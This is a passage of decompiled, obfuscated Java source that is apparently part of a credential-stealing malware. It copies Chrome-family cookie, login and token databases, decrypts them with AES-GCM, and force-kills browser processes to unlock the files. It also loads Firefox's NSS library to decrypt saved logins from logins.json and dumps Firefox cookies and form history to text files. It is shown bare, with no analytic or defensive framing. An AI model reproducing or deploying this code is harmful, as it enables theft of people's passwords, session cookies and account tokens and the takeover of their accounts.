            System.out.println(new StringBuilder().append("[decryptCookies] Copy failed (attempt ").append(var6).append("): ").append(var36.getMessage()).toString());
            if (var6 == 5) {
               System.out.println(new StringBuilder().append("[decryptCookies] Kill fallback: ").append(var2).toString());
               erhlvo(var2);

               try {
                  Thread.sleep(2000);
               } catch (InterruptedException var30) {
               }

               clsatd(var5, var4);
               System.out.println("[decryptCookies] Copy OK after kill fallback");
               break;
            }

            try {
               Thread.sleep(500);
            } catch (InterruptedException var31) {
            }
         }
      }

      ArrayList var37 = new java.util.ArrayList();
      String var7 = new StringBuilder().append("jdbc:sqlite:").append(var4.toString()).toString();
      Connection var8 = java.sql.DriverManager.getConnection(var7);

      try {
         PreparedStatement var9 = var8.prepareStatement("SELECT host_key, name, path, is_secure, expires_utc, encrypted_value FROM cookies");

         try {
            ResultSet var10 = var9.executeQuery();

            try {
               while (var10.next()) {
                  String var11 = var10.getString("host_key");
                  String var12 = var10.getString("name");
                  byte[] var13 = var10.getBytes("encrypted_value");
                  if (var13 != null) {
                     byte[] var14 = lsfzyk(var1, var13);
                     if (var14 != null && var14.length > 32) {
                        String var15;
                        try {
                           var15 = new String(java.util.Arrays.copyOfRange(var14, 32, var14.length), java.nio.charset.StandardCharsets.UTF_8);
                        } catch (Exception var32) {
                           continue;
                        }

                        String var16 = var10.getString("path");
                        boolean var17 = var10.getInt("is_secure")
                           != 0;
                        long var18 = var10.getLong("expires_utc");
                        String var20 = var11.startsWith(".")
                           ? "TRUE"
                           : "FALSE";
                        long var21 = 0L;

                        try {
                           long var23 = var18;
                           if (var23 != 0L) {
                              var21 = var23 / (15 << 16 | (char)16960) - 11644473600L;
                              if (var21 < 0L) {
                                 var21 = 0L;
                              }
                           }
                        } catch (NumberFormatException var29) {
                           var21 = 0L;
                        }

                        var37.add(new StringBuilder().append(var11).append("\t").append(var20).append("\t").append(var16).append("\t").append(var17
                                                      ? "TRUE"
                                                      : "FALSE").append("\t").append(var21).append("\t").append(var12).append("\t").append(var15).toString());
                     }
                  }
               }
            } catch (Throwable var33) {
               if (var10 != null) {
                  try {
                     var10.close();
                  } catch (Throwable var27) {
                     var33.addSuppressed(var27);
                  }
               }

               throw var33;
            }

            if (var10 != null) {
               var10.close();
            }
         } catch (Throwable var34) {
            if (var9 != null) {
               try {
                  var9.close();
               } catch (Throwable var26) {
                  var34.addSuppressed(var26);
               }
            }

            throw var34;
         }

         if (var9 != null) {
            var9.close();
         }
      } catch (Throwable var35) {
         if (var8 != null) {
            try {
               var8.close();
            } catch (Throwable var25) {
               var35.addSuppressed(var25);
            }
         }

         throw var35;
      }

      if (var8 != null) {
         var8.close();
      }

      System.out.println("output");

      try {
         java.nio.file.Files.deleteIfExists(var4);
         java.nio.file.Files.deleteIfExists(var3);
      } catch (IOException var28) {
         var28.printStackTrace();
      }

      return var37;
   }

   public static List<String> pjxlop(String var0, byte[] var1, String var2) throws Exception {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      Path var3 = java.nio.file.Files.createTempDirectory("logins_", new FileAttribute[0]);
      Path var4 = var3.resolve("login_data_copy");
      Path var5 = java.nio.file.Paths.get(var0, new String[0]);

      for (int var6 = 1; var6 <= 5; var6++) {
         try {
            clsatd(var5, var4);
            break;
         } catch (IOException var25) {
            if (var6 == 5) {
               System.out.println(new StringBuilder().append("[loginData] Kill fallback: ").append(var2).toString());
               erhlvo(var2);

               try {
                  Thread.sleep(2000);
               } catch (InterruptedException var20) {
               }

               clsatd(var5, var4);
               break;
            }

            try {
               Thread.sleep(500);
            } catch (InterruptedException var21) {
            }
         }
      }

      ArrayList var26 = new java.util.ArrayList();
      String var7 = new StringBuilder().append("jdbc:sqlite:").append(var4.toString()).toString();
      String var8 = "SELECT origin_url, username_value, password_value FROM logins";
      Connection var9 = java.sql.DriverManager.getConnection(var7);

      try {
         PreparedStatement var10 = var9.prepareStatement(var8);

         try {
            ResultSet var11 = var10.executeQuery();

            try {
               while (var11.next()) {
                  String var12 = var11.getString(1);
                  String var13 = var11.getString(2);
                  byte[] var14 = var11.getBytes(3);
                  String var15 = buqaip(var14, var1);
                  if (var15 != null) {
                     var26.add(String.format("%s\t%s\t%s", new Object[]{
                              var12 != null && !var12.isEmpty()
                                 ? var12
                                 : "N/A",
                              var13 != null
                                    && !var13.isEmpty()
                                 ? var13
                                 : "N/A",
                              var15
                           }));
                  }
               }
            } catch (Throwable var22) {
               if (var11 != null) {
                  try {
                     var11.close();
                  } catch (Throwable var18) {
                     var22.addSuppressed(var18);
                  }
               }

               throw var22;
            }

            if (var11 != null) {
               var11.close();
            }
         } catch (Throwable var23) {
            if (var10 != null) {
               try {
                  var10.close();
               } catch (Throwable var17) {
                  var23.addSuppressed(var17);
               }
            }

            throw var23;
         }

         if (var10 != null) {
            var10.close();
         }
      } catch (Throwable var24) {
         if (var9 != null) {
            try {
               var9.close();
            } catch (Throwable var16) {
               var24.addSuppressed(var16);
            }
         }

         throw var24;
      }

      if (var9 != null) {
         var9.close();
      }

      try {
         java.nio.file.Files.deleteIfExists(var4);
         java.nio.file.Files.deleteIfExists(var3);
      } catch (IOException var19) {
      }

      return var26;
   }

   public static byte[] lsfzyk(byte[] var0, byte[] var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         byte var2 = 3;
         if (var1.length < 31) {
            return null;
         }

         byte[] var3 = java.util.Arrays.copyOfRange(var1, 3, 15);
         byte[] var4 = java.util.Arrays.copyOfRange(var1, 15, var1.length);
         Cipher var5 = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding");
         GCMParameterSpec var6 = new javax.crypto.spec.GCMParameterSpec(128, var3);
         var5.init(2, new javax.crypto.spec.SecretKeySpec(var0, "AES"), var6);
         return var5.doFinal(var4);
      } catch (Exception var7) {
         return null;
      }
   }

   public static String buqaip(byte[] var0, byte[] var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (var0 != null && var0.length != 0) {
         if (var0.length > 3) {
            String var2 = new String(var0, 0, 3, java.nio.charset.StandardCharsets.US_ASCII);
            if ("v20".equals(var2)) {
               if (var0.length < 31) {
                  return null;
               }

               byte[] var3 = java.util.Arrays.copyOfRange(var0, 3, 15);
               byte[] var4 = java.util.Arrays.copyOfRange(var0, 15, var0.length);

               try {
                  Cipher var5 = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding");
                  GCMParameterSpec var6 = new javax.crypto.spec.GCMParameterSpec(128, var3);
                  var5.init(2, new javax.crypto.spec.SecretKeySpec(var1, "AES"), var6);
                  byte[] var7 = var5.doFinal(var4);
                  return new String(var7, java.nio.charset.StandardCharsets.UTF_8);
               } catch (Exception var8) {
                  return null;
               }
            }
         }

         return null;
      } else {
         return null;
      }
   }

   public static String tcdjje(byte[] var0, byte[] var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (var0 != null && var0.length > 19) {
         try {
            byte[] var2 = java.util.Arrays.copyOfRange(var0, 3, 19);
            byte[] var3 = java.util.Arrays.copyOfRange(var0, 19, var0.length);
            Cipher var4 = javax.crypto.Cipher.getInstance("AES/CBC/PKCS5Padding");
            var4.init(2, new javax.crypto.spec.SecretKeySpec(var1, "AES"), new javax.crypto.spec.IvParameterSpec(var2));
            byte[] var5 = var4.doFinal(var3);
            return new String(var5, java.nio.charset.StandardCharsets.UTF_8);
         } catch (Exception var6) {
            return null;
         }
      } else {
         return null;
      }
   }

   public static String hnuqqc(byte[] var0, byte[] var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (var0 != null && var0.length >= 3) {
         String var2 = new String(var0, 0, 3, java.nio.charset.StandardCharsets.US_ASCII);
         return "v20".equals(var2)
            ? buqaip(var0, var1)
            : tcdjje(var0, var1);
      } else {
         return null;
      }
   }

   // $VF: Could not verify finally blocks. A semaphore variable has been added to preserve control flow.
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static List<String> vyhwho(String var0, byte[] var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      ArrayList var2 = new java.util.ArrayList();
      Properties var3 = new java.util.Properties();
      Connection var4 = wfrkmv(var0, var3);
      if (var4 == null) {
         return var2;
      }

      boolean var25 = false /* VF: Semaphore variable */;

      try {
         try {
            var25 = true;
            Statement var5 = var4.createStatement();

            try {
               ResultSet var6 = var5.executeQuery("SELECT service, encrypted_token FROM token_service");

               try {
                  while (var6.next()) {
                     String var7 = var6.getString("service");
                     byte[] var8 = var6.getBytes("encrypted_token");
                     if (var8 != null && var8.length != 0) {
                        String var9 = hnuqqc(var8, var1);
                        if (var9 != null && !var9.isEmpty()) {
                           var2.add(new StringBuilder().append(var7 == null ? "N/A" : var7).append("\t").append(var9).toString());
                        }
                     }
                  }
               } catch (Throwable var35) {
                  if (var6 != null) {
                     try {
                        var6.close();
                     } catch (Throwable var31) {
                        var35.addSuppressed(var31);
                     }
                  }

                  throw var35;
               }

               if (var6 != null) {
                  var6.close();
               }
            } catch (Throwable var36) {
               if (var5 != null) {
                  try {
                     var5.close();
                  } catch (Throwable var30) {
                     var36.addSuppressed(var30);
                  }
               }

               throw var36;
            }

            if (var5 != null) {
               var5.close();
            }
         } catch (SQLException var37) {
         }

         try {
            Statement var39 = var4.createStatement();

            try {
               ResultSet var40 = var39.executeQuery("SELECT email FROM web_accounts");

               try {
                  while (var40.next()) {
                     String var41 = var40.getString("email");
                     if (var41 != null && !var41.isEmpty()) {
                        var2.add(new StringBuilder().append("email\t").append(var41).toString());
                     }
                  }
               } catch (Throwable var32) {
                  if (var40 != null) {
                     try {
                        var40.close();
                     } catch (Throwable var29) {
                        var32.addSuppressed(var29);
                     }
                  }

                  throw var32;
               }

               if (var40 != null) {
                  var40.close();
               }
            } catch (Throwable var33) {
               if (var39 != null) {
                  try {
                     var39.close();
                  } catch (Throwable var28) {
                     var33.addSuppressed(var28);
                  }
               }

               throw var33;
            }

            if (var39 != null) {
               var39.close();
               var25 = false;
            } else {
               var25 = false;
            }
         } catch (SQLException var34) {
            var25 = false;
         }
      } finally {
         if (var25) {
            try {
               var4.close();
            } catch (Exception var26) {
            }
         }
      }

      try {
         var4.close();
      } catch (Exception var27) {
      }

      return var2;
   }

   // $VF: Could not verify finally blocks. A semaphore variable has been added to preserve control flow.
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void erhlvo(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      InputStream var1 = null;
      BufferedReader var2 = null;
      boolean var18 = false /* VF: Semaphore variable */;

      label140: {
         try {
            var18 = true;
            String var3 = var0.toLowerCase().endsWith(".exe")
               ? var0
               : new StringBuilder().append(var0).append(".exe").toString();
            Process var4 = new ProcessBuilder(new String[]{
                        "taskkill",
                        "/F",
                        "/T",
                        "/IM",
                        var3
                     }).redirectErrorStream(true).start();
            var1 = var4.getInputStream();
            var2 = new java.io.BufferedReader(new java.io.InputStreamReader(var1, "CP866"));
            StringBuilder var5 = new StringBuilder();

            String var6;
            while (
               (
                     var6 = var2.readLine()
                  )
                  != null
            ) {
               var5.append(var6).append('\n');
            }

            int var7 = var4.waitFor();
            System.out.println(new StringBuilder().append("[killProcess] taskkill /F /T /IM ").append(var3).append(" exited with ").append(var7).toString());
            System.out.println(new StringBuilder().append("[killProcess] output:\n").append(var5.toString()).toString());
            var18 = false;
            break label140;
         } catch (Exception var25) {
            System.out.println(new StringBuilder().append("[killProcess] error: ").append(var25.getMessage()).toString());
            var18 = false;
         } finally {
            if (var18) {
               try {
                  if (var2 != null) {
                     var2.close();
                  }
               } catch (IOException var20) {
               }

               try {
                  if (var1 != null) {
                     var1.close();
                  }
               } catch (IOException var19) {
               }
            }
         }

         try {
            if (var2 != null) {
               var2.close();
            }
         } catch (IOException var22) {
         }

         try {
            if (var1 != null) {
               var1.close();
               return;
            }
         } catch (IOException var21) {
         }

         return;
      }

      try {
         if (var2 != null) {
            var2.close();
         }
      } catch (IOException var24) {
      }

      try {
         if (var1 != null) {
            var1.close();
         }
      } catch (IOException var23) {
      }
   }

   public static String ydzttw(byte[] var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      StringBuilder var1 = new StringBuilder(var0.length * 2);

      for (byte var5 : var0) {
         var1.append(String.format("%02x", new Object[]{
                  java.lang.Byte.valueOf(var5)
               }));
      }

      return var1.toString();
   }

   // $VF: Could not verify finally blocks. A semaphore variable has been added to preserve control flow.
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   private static void imuxzw(String var0, String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (lentil) {
         Path var2 = java.nio.file.Paths.get(var0, new String[]{"cookies.sqlite"});
         if (java.nio.file.Files.exists(var2, new LinkOption[0])) {
            Path var3 = null;
            boolean var34 = false /* VF: Semaphore variable */;

            label273: {
               try {
                  var34 = true;
                  var3 = java.nio.file.Files.createTempFile("cookies", ".sqlite", new FileAttribute[0]);
                  java.nio.file.Files.copy(var2, var3, new CopyOption[]{
                        java.nio.file.StandardCopyOption.REPLACE_EXISTING
                     });
                  String var4 = new StringBuilder().append("jdbc:sqlite:").append(var3.toString()).toString();
                  Connection var5 = java.sql.DriverManager.getConnection(var4);

                  try {
                     Statement var6 = var5.createStatement();

                     try {
                        ResultSet var7 = var6.executeQuery("SELECT host, name, value, path, expiry, isSecure FROM moz_cookies");

                        try {
                           File var8 = new File(var1, "[OLD Cookies] Firefox.txt");
                           BufferedWriter var9 = new java.io.BufferedWriter(new java.io.FileWriter(var8, false));

                           try {
                              while (var7.next()) {
                                 String var10 = var7.getString(1);
                                 String var11 = var7.getString(2);
                                 String var12 = var7.getString(3);
                                 String var13 = var7.getString(4);
                                 long var14 = var7.getLong(5);
                                 boolean var16 = var7.getInt(6)
                                    != 0;
                                 boolean var17 = var10 != null
                                    && var10.startsWith(".");
                                 String var18 = String.format("%s\t%s\t%s\t%s\t%d\t%s\t%s", new Object[]{
                                       var10,
                                       var17
                                          ? "TRUE"
                                          : "FALSE",
                                       var13,
                                       var16
                                          ? "TRUE"
                                          : "FALSE",
                                       Long.valueOf(var14),
                                       var11,
                                       var12
                                    });
                                 var9.write(var18);
                                 var9.newLine();
                              }
                           } catch (Throwable var42) {
                              try {
                                 var9.close();
                              } catch (Throwable var40) {
                                 var42.addSuppressed(var40);
                              }

                              throw var42;
                           }

                           var9.close();
                        } catch (Throwable var43) {
                           if (var7 != null) {
                              try {
                                 var7.close();
                              } catch (Throwable var39) {
                                 var43.addSuppressed(var39);
                              }
                           }

                           throw var43;
                        }

                        if (var7 != null) {
                           var7.close();
                        }
                     } catch (Throwable var44) {
                        if (var6 != null) {
                           try {
                              var6.close();
                           } catch (Throwable var38) {
                              var44.addSuppressed(var38);
                           }
                        }

                        throw var44;
                     }

                     if (var6 != null) {
                        var6.close();
                     }
                  } catch (Throwable var45) {
                     if (var5 != null) {
                        try {
                           var5.close();
                        } catch (Throwable var37) {
                           var45.addSuppressed(var37);
                        }
                     }

                     throw var45;
                  }

                  if (var5 != null) {
                     var5.close();
                     var34 = false;
                  } else {
                     var34 = false;
                  }
                  break label273;
               } catch (Exception var46) {
                  var34 = false;
               } finally {
                  if (var34) {
                     if (var3 != null) {
                        try {
                           java.nio.file.Files.deleteIfExists(var3);
                        } catch (Exception var35) {
                        }
                     }
                  }
               }

               if (var3 != null) {
                  try {
                     java.nio.file.Files.deleteIfExists(var3);
                  } catch (Exception var36) {
                  }

                  return;
               }

               return;
            }

            if (var3 != null) {
               try {
                  java.nio.file.Files.deleteIfExists(var3);
               } catch (Exception var41) {
               }
            }
         }
      }
   }

   // $VF: Could not verify finally blocks. A semaphore variable has been added to preserve control flow.
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   private static void jcccfx(String var0, String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (storm) {
         Path var2 = java.nio.file.Paths.get(var0, new String[]{"formhistory.sqlite"});
         if (java.nio.file.Files.exists(var2, new LinkOption[0])) {
            Path var3 = null;
            boolean var33 = false /* VF: Semaphore variable */;

            label229: {
               try {
                  var33 = true;
                  var3 = java.nio.file.Files.createTempFile("formhistory", ".sqlite", new FileAttribute[0]);
                  java.nio.file.Files.copy(var2, var3, new CopyOption[]{
                        java.nio.file.StandardCopyOption.REPLACE_EXISTING
                     });
                  String var4 = new StringBuilder().append("jdbc:sqlite:").append(var3.toString()).toString();
                  Connection var5 = java.sql.DriverManager.getConnection(var4);

                  try {
                     Statement var6 = var5.createStatement();

                     try {
                        ResultSet var7 = var6.executeQuery("SELECT fieldname, value, timesUsed, firstUsed, lastUsed FROM moz_formhistory");

                        try {
                           File var8 = new File(var1, "Firefox.txt");
                           BufferedWriter var9 = new java.io.BufferedWriter(new java.io.FileWriter(var8, false));

                           try {
                              while (var7.next()) {
                                 String var10 = var7.getString(1);
                                 String var11 = var7.getString(2);
                                 int var12 = var7.getInt(3);
                                 long var13 = var7.getLong(4);
                                 long var15 = var7.getLong(5);
                                 String var17 = new StringBuilder().append(var10).append("\t").append(var11).append("\t").append(var12).append("\t").append(var13).append("\t").append(var15).toString();
                                 var9.write(var17);
                                 var9.newLine();
                              }
                           } catch (Throwable var41) {
                              try {
                                 var9.close();
                              } catch (Throwable var39) {
                                 var41.addSuppressed(var39);
                              }

                              throw var41;
                           }

                           var9.close();
                        } catch (Throwable var42) {
                           if (var7 != null) {
                              try {
                                 var7.close();
                              } catch (Throwable var38) {
                                 var42.addSuppressed(var38);
                              }
                           }

                           throw var42;
                        }

                        if (var7 != null) {
                           var7.close();
                        }
                     } catch (Throwable var43) {
                        if (var6 != null) {
                           try {
                              var6.close();
                           } catch (Throwable var37) {
                              var43.addSuppressed(var37);
                           }
                        }

                        throw var43;
                     }

                     if (var6 != null) {
                        var6.close();
                     }
                  } catch (Throwable var44) {
                     if (var5 != null) {
                        try {
                           var5.close();
                        } catch (Throwable var36) {
                           var44.addSuppressed(var36);
                        }
                     }

                     throw var44;
                  }

                  if (var5 != null) {
                     var5.close();
                     var33 = false;
                  } else {
                     var33 = false;
                  }
                  break label229;
               } catch (Exception var45) {
                  var33 = false;
               } finally {
                  if (var33) {
                     if (var3 != null) {
                        try {
                           java.nio.file.Files.deleteIfExists(var3);
                        } catch (Exception var34) {
                        }
                     }
                  }
               }

               if (var3 != null) {
                  try {
                     java.nio.file.Files.deleteIfExists(var3);
                  } catch (Exception var35) {
                  }

                  return;
               }

               return;
            }

            if (var3 != null) {
               try {
                  java.nio.file.Files.deleteIfExists(var3);
               } catch (Exception var40) {
               }
            }
         }
      }
   }

   private static boolean yoknzo() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (sponge != null) {
         return true;
      }

      try {
         sponge = cradle.desert("Native.load nss3", new Callable<sherbet>() {
            public sherbet call() throws Exception {
               if (rkjsezrwcf.jzdety() != 0) {
                  rkjsezrwcf.bbsnvj();
               }

               return (sherbet)Native.load("nss3", sherbet.class);
            }
         });
         return true;
      } catch (UnsatisfiedLinkError var1) {
         var1.printStackTrace();
         return false;
      } catch (Exception var2) {
         throw new java.lang.RuntimeException(var2);
      }
   }

   public static void dbovpq() throws Exception {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var0 = wxtlvl();
      String var1 = rnagxe();
      String var2 = new File(new StringBuilder().append(lantern).append("\\Cookies").toString()).getAbsolutePath();
      if (var0 != null && var1 != null) {
         File var3 = new File(var2);
         if (!var3.exists()) {
            try {
               var3.mkdirs();
            } catch (Exception var26) {
            }
         }

         if (!kukavp(var0)) {
            System.err.println(new StringBuilder().append("Failed to load NSS from: ").append(var0).toString());
         } else if (!pvrheb(var1)) {
            System.err.println(new StringBuilder().append("Failed to init NSS with profile: ").append(var1).toString());
         } else {
            try {
               Path var4 = java.nio.file.Paths.get(var1, new String[]{"logins.json"});
               if (!java.nio.file.Files.exists(var4, new LinkOption[0])) {
                  System.err.println(new StringBuilder().append("logins.json not found in profile: ").append(var4).toString());
                  return;
               }

               String var5 = new String(java.nio.file.Files.readAllBytes(var4), java.nio.charset.StandardCharsets.UTF_8);
               JSONObject var6 = new JSONObject(var5);
               JSONArray var7 = var6.optJSONArray("logins");
               if (var7 == null) {
                  System.out.println("No logins found.");
                  return;
               }

               Pointer var8 = sponge.PK11_GetInternalKeySlot();
               if (var8 == null) {
                  System.err.println("PK11_GetInternalKeySlot returned null");
                  return;
               }

               int var9 = sponge.PK11_Authenticate(var8, true, Pointer.NULL);
               if (var9 == 0) {
                  if (storm) {
                     File var10 = new File(new StringBuilder().append(lantern).append("\\Autofill").toString(), "Firefox_logins.txt");
                     BufferedWriter var11 = new java.io.BufferedWriter(new java.io.FileWriter(var10, false));

                     try {
                        for (int var12 = 0; var12 < var7.length(); var12++) {
                           JSONObject var13 = var7.getJSONObject(var12);
                           String var14 = var13.optString("hostname");
                           String var15 = var13.optString("encryptedUsername");
                           String var16 = var13.optString("encryptedPassword");
                           String var17 = wyzkdx(var15);
                           String var18 = wyzkdx(var16);
                           String var19 = new StringBuilder().append(var14).append("\t").append(var17).append("\t").append(var18).toString();
                           var11.write(var19);
                           var11.newLine();
                        }
                     } catch (Throwable var27) {
                        try {
                           var11.close();
                        } catch (Throwable var25) {
                           var27.addSuppressed(var25);
                        }

                        throw var27;
                     }

                     var11.close();
                  }

                  imuxzw(var1, var2);
                  jcccfx(
                     var1,
                     new StringBuilder().append(lantern).append("\\Autofill").toString()
                  );
                  return;
               }

               System.err.println(new StringBuilder().append("PK11_Authenticate failed, code=").append(var9).append(". If master password is set, it's not supported yet.").toString());
            } finally {
               sponge.NSS_Shutdown();
            }
         }
      }
   }

   private static String wyzkdx(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         byte[] var1 = java.util.Base64.getDecoder().decode(var0);
         pattern var2 = new pattern();
         var2.type = 0;
         var2.len = var1.length;
         var2.data = new Memory(var1.length);
         var2.data.write(0L, var1, 0, var1.length);
         pattern var3 = new pattern();
         var3.type = 0;
         var3.len = 0;
         var3.data = Pointer.NULL;
         int var4 = sponge.PK11SDR_Decrypt(var2, var3, Pointer.NULL);
         if (var4 != 0) {
            return new StringBuilder().append("<decrypt_failed:").append(var4).append(">").toString();
         }

         byte[] var5 = var3.data.getByteArray(0L, var3.len);
         return new String(var5, java.nio.charset.StandardCharsets.UTF_8);
      } catch (Throwable var6) {
         return "<error>";
      }
   }

   private static String wxtlvl() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String[] var0 = new String[]{
         new StringBuilder().append(System.getenv("PROGRAMFILES")).append("\\Mozilla Firefox").toString(),
         new StringBuilder().append(System.getenv("PROGRAMFILES(X86)")).append("\\Mozilla Firefox").toString()
      };

      for (String var4 : var0) {
         if (var4 != null
            && new File(var4, "nss3.dll").exists()) {
            return var4;
         }

         if (var4 != null
            && new File(var4, "bin\\nss3.dll").exists()) {
            return new File(var4, "bin").getAbsolutePath();
         }
      }

      return null;
   }

   public static String rnagxe() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var0 = System.getenv("APPDATA");
      if (var0 == null) {
         return null;
      }

      Path var1 = java.nio.file.Paths.get(var0, new String[]{"Mozilla", "Firefox"});
      Path var2 = var1.resolve("profiles.ini");
      if (!java.nio.file.Files.exists(var2, new LinkOption[0])) {
         return null;
      }

      try {
         BufferedReader var3 = new java.io.BufferedReader(new java.io.FileReader(var2.toFile()));

         label122: {
            String var25;
            label121: {
               String var14;
               try {
                  ArrayList var5 = new java.util.ArrayList();
                  HashMap var6 = null;

                  String var4;
                  while (
                     (
                           var4 = var3.readLine()
                        )
                        != null
                  ) {
                     var4 = var4.trim();
                     if (var4.startsWith("[")) {
                        if (var6 != null) {
                           var5.add(var6);
                        }

                        var6 = new java.util.HashMap();
                     } else {
                        int var7 = var4.indexOf(61);
                        if (var7 > 0 && var6 != null) {
                           var6.put(var4.substring(0, var7).trim(), var4.substring(var7 + 1).trim());
                        }
                     }
                  }

                  if (var6 != null) {
                     var5.add(var6);
                  }

                  ArrayList var20 = new java.util.ArrayList();
                  Iterator var8 = var5.iterator();

                  while (var8.hasNext()) {
                     Map var9 = (Map)var8.next();
                     var25 = (String)var9.get("Path");
                     if (var25 != null) {
                        String var11 = (String)var9.getOrDefault("IsRelative", "1");
                        Path var12 = "1".equals(var11)
                           ? var1.resolve(var25)
                           : java.nio.file.Paths.get(var25, new String[0]);
                        var20.add(var12);
                     }
                  }

                  var20.sort((var0x, var1x) -> {
                        if (rkjsezrwcf.jzdety() != 0) {
                           rkjsezrwcf.bbsnvj();
                        }

                        boolean var2x = var0x.getFileName().toString().contains("default-release");
                        boolean var3x = var1x.getFileName().toString().contains("default-release");
                        if (var2x != var3x) {
                           return var2x ? -1 : 1;
                        }

                        try {
                           return Long.compare(java.nio.file.Files.getLastModifiedTime(var1x, new LinkOption[0]).toMillis(), java.nio.file.Files.getLastModifiedTime(var0x, new LinkOption[0]).toMillis());
                        } catch (Exception var5x) {
                           return 0;
                        }
                     });
                  var8 = var20.iterator();

                  while (var8.hasNext()) {
                     Path var23 = (Path)var8.next();
                     if (java.nio.file.Files.isDirectory(var23, new LinkOption[0])
                        && java.nio.file.Files.exists(var23.resolve("key4.db"), new LinkOption[0])
                        && java.nio.file.Files.exists(var23.resolve("logins.json"), new LinkOption[0])) {
                        var25 = var23.toFile().getAbsolutePath();
                        break label121;
                     }
                  }

                  Path var22 = var1.resolve("Profiles");
                  if (!java.nio.file.Files.isDirectory(var22, new LinkOption[0])) {
                     break label122;
                  }

                  try {
                     File[] var24 = (File[])java.util.Objects.requireNonNull(var22.toFile().listFiles(File::isDirectory));
                     int var26 = var24.length;
                     int var27 = 0;

                     while (true) {
                        if (var27 >= var26) {
                           break label122;
                        }

                        File var28 = var24[var27];
                        Path var13 = var28.toPath();
                        if (java.nio.file.Files.exists(var13.resolve("key4.db"), new LinkOption[0])
                           && java.nio.file.Files.exists(var13.resolve("logins.json"), new LinkOption[0])) {
                           var14 = var13.toFile().getAbsolutePath();
                           break;
                        }

                        var27++;
                     }
                  } catch (Exception var16) {
                     break label122;
                  }
               } catch (Throwable var17) {
                  try {
                     var3.close();
                  } catch (Throwable var15) {
                     var17.addSuppressed(var15);
                  }

                  throw var17;
               }

               var3.close();
               return var14;
            }

            var3.close();
            return var25;
         }

         var3.close();
      } catch (Exception var18) {
      }

      return null;
   }

   private static boolean kukavp(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      File var1 = new File(var0);
      if (!var1.isDirectory()) {
         return false;
      }

      dcjrfu(
         var1.getAbsolutePath()
      );

      try {
         NativeLibrary.addSearchPath(
            "mozglue",
            var1.getAbsolutePath()
         );
         NativeLibrary.addSearchPath(
            "nss3",
            var1.getAbsolutePath()
         );
         NativeLibrary.addSearchPath(
            "nssutil3",
            var1.getAbsolutePath()
         );
         NativeLibrary.addSearchPath(
            "nspr4",
            var1.getAbsolutePath()
         );
         NativeLibrary.addSearchPath(
            "plc4",
            var1.getAbsolutePath()
         );
         NativeLibrary.addSearchPath(
            "plds4",
            var1.getAbsolutePath()
         );
         NativeLibrary.addSearchPath(
            "softokn3",
            var1.getAbsolutePath()
         );
         NativeLibrary.addSearchPath(
            "freebl3",
            var1.getAbsolutePath()
         );
      } catch (Throwable var5) {
      }

      File var2 = new File(var1, "mozglue.dll");
      if (var2.exists()) {
         try {
            System.load(var2.getAbsolutePath());
         } catch (Throwable var4) {
         }
      }

      return yoknzo();
   }

   private static void dcjrfu(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         String var1 = System.getenv("PATH");
         String var2;
         if (var1 != null && !var1.isEmpty()) {
            if (var1.toLowerCase(java.util.Locale.ROOT).contains(var0.toLowerCase(java.util.Locale.ROOT))) {
               var2 = var1;
            } else {
               var2 = new StringBuilder().append(var0).append(";").append(var1).toString();
            }
         } else {
            var2 = var0;
         }

         System.setProperty("jna.library.path", new StringBuilder().append(var0).append(File.pathSeparator).append(System.getProperty("jna.library.path", "")).toString());

         try {
            Class var3 = java.lang.Class.forName("java.lang.ProcessEnvironment");
            Field var10 = var3.getDeclaredField("theCaseInsensitiveEnvironment");
            var10.setAccessible(true);
            Map var11 = (Map)var10.get(null);
            var11.put("PATH", var2);
         } catch (Throwable var8) {
            try {
               Map var4 = System.getenv();
               Field var5 = var4.getClass().getDeclaredField("m");
               var5.setAccessible(true);
               Map var6 = (Map)var5.get(var4);
               var6.put("PATH", var2);
            } catch (Throwable var7) {
            }
         }
      } catch (Throwable var9) {
      }
   }

   private static boolean pvrheb(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (!yoknzo()) {
         return false;
      }

      int var1 = sponge.NSS_Init(
         new StringBuilder().append("sql:").append(var0).toString()
      );
      if (var1 != 0) {
         var1 = sponge.NSS_Init(var0);
      }

      return var1 == 0;
   }

   private static void jqaszy(ExecutorService var0, Runnable var1, int var2) {
      if (rkjsezrwcf.jzdety() != 0) {
